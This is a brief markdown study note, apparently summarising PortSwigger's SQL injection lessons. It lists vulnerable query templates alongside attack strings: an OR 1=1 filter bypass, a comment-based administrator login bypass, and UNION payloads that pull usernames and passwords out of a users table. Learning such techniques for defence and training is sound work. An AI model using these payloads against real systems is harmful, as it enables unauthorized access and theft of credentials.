https://portswigger.net/web-security/sql-injection

### WHERE Clause
`SELECT * FROM products WHERE category = '{}' AND released = 1`  
Attack (GET URL): ?category='+OR+1%3d1--  

### Login Bypass (Subvert Logic)
`SELECT * FROM users WHERE username = '{}' AND password = '{}'`  
Attack (POST Method): username=administrator'--&password=123  

### UNION Attacks
**Conditions**  
1. Both queries must return same number of columns  
`ORDER BY {index number}`  
2. Compatible data types in each column  
`UNION SELECT NULL,'a',NULL,NULL`  
<br>
**Techniques**  
1. Retrieving multiple values within a single column (concatenation)  
`UNION SELECT NULL,username||'~'||password FROM users`  

### Examine Database


[Syntax Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
